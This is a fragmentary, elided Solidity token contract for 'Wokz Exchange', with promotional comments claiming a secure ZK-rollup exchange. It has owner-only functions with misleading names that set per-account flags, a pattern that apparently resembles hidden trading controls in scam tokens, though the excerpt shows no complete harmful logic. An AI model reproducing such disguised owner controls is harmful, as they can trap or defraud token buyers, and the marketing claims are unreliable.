...
// Wokz Exchange
// Decentralized Exchange Powered by Zero-Knowledge 
// Technology Wokz Exchange is a native, easy-to-use, reliable, fully secure and low fee Decentralized Exchange built on ZK Rollups.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Wokz Exchange';
    string constant public symbol = 'WOKZ';
    ...
    function DefunctionsExcludeFee(address account) public onlyOwner {
    ...
    function WokzTradeFunctions(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function DEXTradeOnPancake(address account) public view returns (bool) {
